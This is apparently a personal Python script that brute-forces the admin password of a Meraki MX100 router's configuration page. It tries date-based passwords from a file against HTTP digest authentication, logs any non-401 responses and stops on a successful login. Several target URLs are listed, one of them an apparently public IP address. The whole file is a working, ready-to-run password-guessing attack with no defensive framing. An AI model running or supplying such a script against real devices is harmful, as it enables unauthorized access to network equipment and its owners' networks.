import requests
from requests.auth import HTTPDigestAuth

# different ways to get to the config page of the MX100
testurl = 'https://www.google.com'
url1 = 'http://172.16.1.1/configure'
url2 = 'http://setup.meraki.com/configure'
url3 = 'http://138.207.175.210/configure'
url4 = 'http://172.16.1.1/configure/index.cgi'

# fresh off the stack overflow griddle
with open('dates.txt') as file:
    # tf is list comprehension?
    passwords = [line.rstrip() for line in file]

# manual progress tracking, I know
total = 0


# make a request with each password, starting at the last one logged
for i in range(total, len(passwords)):
    # too easy
    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i]))
    # Reference: 401 Unauthorized & 200 Ok
    # triggers on status codes other than 200 but i'd want to know about those, too
    if not request.status_code == 401:
        print(f'\n\n Status {request.status_code} detected: used \"{passwords[i]}\" and counter at {i}')
        # writes results to a file
        # NOT TESTED
        with open('results.txt', 'a') as file:
            file.write(f'Password: {passwords[i]}\nCounter: {i}\nStatus: {request.status_code}\n\n')
        # only ends on a 2xx sucessful auth
        if 200 <= request.status_code < 300:
            break
    # decreases the wall of spam, at the cost of not being able to see the status code for each request
    if i % 100 == 0:
        print(f'{i}, ', end='')


# r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
# print(r.status_code)
